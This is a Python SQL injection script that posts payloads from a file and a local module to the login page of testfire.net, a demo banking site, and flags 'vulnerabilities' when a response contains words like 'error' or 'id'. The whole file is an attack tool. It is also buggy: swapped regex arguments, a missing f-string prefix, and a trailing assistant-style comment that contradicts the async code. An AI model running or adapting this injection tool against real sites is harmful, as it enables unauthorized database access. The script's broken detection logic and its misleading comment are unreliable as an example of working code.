import sys
sys.path.append(r"D:\SQLjj\SQLJ\Database")
from database import main_prog,extraction
import asyncio
import requests
from colorama import Fore,init
import re
import glob
import os
import socket
import time

init()

pattern = r"\berror\b"
htmlpattern = r"\bid\b"

async def blind_attack():
    try:
        # await main_prog()
        url = "http://testfire.net/login.jsp"
        pattern = r"\berror\b"
        htmlpattern = r"\bid\b"
        r = requests.get(url)
        if r.status_code == 200:
            payloadask = input("Looks like the Host is up.Do you want to send a payload to the target?")
            if payloadask == "y":
                # await extraction()
                for i in extraction:
                    for j in i:
                        new = j
                        new = str(new)
                        print(new)
                        # print(new+new+new+new+new)
                        # print(str(i))
                        await asyncio.sleep(10)
                req = requests.post(url=url,data=str(new))
                print(req.status_code)
                done = False
                while not done:
                    req = requests.post(url=url,data=str(new)+str(new)+str(new)+str(new)+str(new))
                    if req.status_code == 302:
                        done = True
                    else:
                        await asyncio.sleep(5)
                        print("Status code:",req.status_code)
                        print(Fore.RED+str(req.status_code))
                        await asyncio.sleep(5)
                        print("exploiting...")
                        print(req.text)
                        if "Syntax error" in req.text:
                            print(Fore.RED+"Vulnerability found:",req.text)
                            print(req.text)
                            
                        if re.search(pattern,req.text,flags=re.IGNORECASE):
                            print(Fore.RED+"Vulnerability found:",req.text)
                            print(req.text)
                        
                        info = re.findall(htmlpattern,req.text,flags=re.IGNORECASE)
                        if info:
                            print(Fore.GREEN+"Vulnerability found at the row lenght:",len(req.text))
                            print(req.text)
                            pattern = r'\b\S+\s+id\s+\S+\b'
      # Regular expression pattern to match the word 'id' and the neighboring words
                            matches = re.findall(pattern, req.text, flags=re.IGNORECASE)
                            if matches:
                                print(Fore.GREEN+"Vulnerability found at the row lenght:",len(req.text))
                                # print(req.text)
                                
                            else:
                                print(Fore.GREEN+"nothing found")
                        

                
        else:
            # raise SystemExit
            pass
        # print(Fore.RED+str(r.status_code))
                
    except ConnectionError:
        pass
    
    except requests.ConnectionError:
        print("error")
        
    except NameError as e:
        print("Name error occurred:",e)
        
    finally:
        pass
            


async def generic_sql_attack():
    try:
        global pattern,htmlpattern
        done = False
        filename = "genericsql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            url = "http://testfire.net/login.jsp"
            req = requests.get(url)
            if req.status_code == 200:
                ask = input(Fore.GREEN + "Looks like the host is up with the ip address: {socket.gethostbyname(url)} Do you want to send the payload to the website? ")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        print(line)
                        ack = requests.post(url=url, data=line)
                        print("|Current payload: |", line,"|with status code|:",ack.status_code)
                        print(Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(Fore.RED + "|Vulnerability found|:", ack.text)
                            
                        vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                        htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                        if vuln:
                            print(Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln))
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(Fore.GREEN + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN))
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302:
                        print("Could inject the sq;; to the website:",line)
                        done = True
                        
                    
                            
                            
                        
                            

    except Exception as e:
        print(f"Error: {str(e)}")
        
    except UnicodeEncodeError:
        pass
    
    except KeyboardInterrupt:
        ch = input(Fore.RED+"[!] Are you sure that you want to exit?")
        if ch == "y":
            raise SystemExit
        else:
            pass
        
        

asyncio.run(generic_sql_attack())
# Please note that this code assumes that you have the colorama library installed for the color formatting. Additionally, it uses a regular function call instead of asynchronous code since there were no asynchronous operations in the original code. If you intend to make asynchronous requests, you would need to use an appropriate library like aiohttp and structure your code accordingly.





